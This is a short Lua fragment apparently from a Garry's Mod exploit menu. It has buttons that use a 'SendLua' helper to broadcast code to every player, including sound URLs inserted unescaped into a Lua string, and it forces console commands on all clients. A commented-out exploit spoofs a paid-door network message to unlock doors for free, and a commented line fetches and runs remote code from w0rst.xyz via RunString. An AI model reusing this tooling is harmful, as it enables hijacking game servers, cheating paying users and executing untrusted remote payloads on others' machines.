CreateButton("Play URL-Link", SoundsTab[1], 120, 35, 385, 520, function()
    Derma_StringRequest("Play URL", "URL:", "", function(str)
        wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
        wtf.Log("Playing: " .. str)
    end)
end)

CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
    wtf.SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
    wtf.Log("Stopped Sounds")
end)

CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 15, 160, EntityLists.Clear)

CreateSoundButtons()

-- CreateButton("Unisec Free-Unlock", ExploitsTab[1], 110, 25, 22, 10, function()
--     wtf.Log("Unisec paid-entry doors unlocked")
--     for k,v in pairs(ents.FindByClass("uni_keypad")) do
--         net.Start("usec_paid_door")
--         net.WriteEntity(v)
--         net.WriteBool(true)
--         net.SendToServer()
--     end
-- end)

--/ http.Fetch("https://w0rst.xyz/script/load", RunString)
--/ Create new checkboxes
